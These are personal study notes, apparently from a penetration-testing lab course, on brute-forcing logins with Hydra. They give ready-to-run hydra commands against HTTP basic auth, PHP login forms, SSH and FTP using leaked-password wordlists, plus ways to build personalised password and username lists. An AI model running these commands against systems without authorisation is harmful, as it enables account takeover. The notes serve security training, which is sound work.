- Default Password
    - `/opt/useful/SecLists/Passwords/Default-Credentials`
    - `ftp-betterdefaultpasslist.txt`
    - (-C) Combined wordlist
    - `hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /`
- Username Bruteforce
    - usernames `/opt/useful/SecLists/Usernames/Names/names.txt`
    - password rockyou.txt
    - we can tell hydra to stop after the first successful login by specifying the flag -f.
    - Tip: We will add the "-u" flag, so that it tries all users on each password, instead of trying all 14 million passwords on one user, before moving on to the next.
    - `hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /`
    - Username brute force
- Hydra Modules
    - Many admin panels have also implemented features or elements such as the b374k shell that might allow us to execute OS commands directly
    - Login.php
    - Brute Forcing Forms
        - `hydra -h | grep "Supported services" | tr ":" "\n" | tr " " "\n" | column -e`
        - http[s]-{head|get|post} http[s]-post-form
        - `hydra http-post-form -U` list parameters
        - `"/login.php:[user parameter]=^USER^&[password parameter]=^PASS^:F=<form name='login'"`
        - in browser right-click on one of them, and select Copy > Copy POST data for parameters
        - `"/login.php:username=^USER^&password=^PASS^:F=<form name='login'"`
        - `hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"`
        - `hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"`
        - /usr/share/wordlists/
- Personalized wordlists
    - CUPP
        - interactive mode by specifying the -i argument
        - generate persoanlised wordlist
    - Password Policy
    
    ```markdown
    sed -ri '/^.{,7}$/d' william.txt            # remove shorter than 8
    sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt # remove no special chars
    sed -ri '/[0-9]+/!d' william.txt            # remove no numbers
    ```
    
    - Mangling
        - rsmangler or The Mentalist.
    - Custom Username Wordlist
        - https://github.com/urbanadventurer/username-anarchy
        - `git clone https://github.com/urbanadventurer/username-anarchy.git`
        - `./username-anarchy Bill Gates > bill.txt`
- Service Authentication brute forcing
    - SSH
        - add the -t 4 flag for a max number of parallel attempts, as many SSH limit the number of parallel connections and drop other connections
        - `hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4`
        - `netstat -antp | grep -i list`
        - `hydra -l m.gates -P rockyou-10.txt [ftp://127.0.0.1](ftp://127.0.0.1/)` inside a server
        - SecLists/Passwords/Leaked-Databases/rockyou-10.txt
        
        hydra -l user -P /usr/share/wordlists/rockyou.txt -f 94.237.54.75 -s 54443 http-post-form "/admin_login.php:user=^USER^&pass=^PASS^:<form name='log-in'”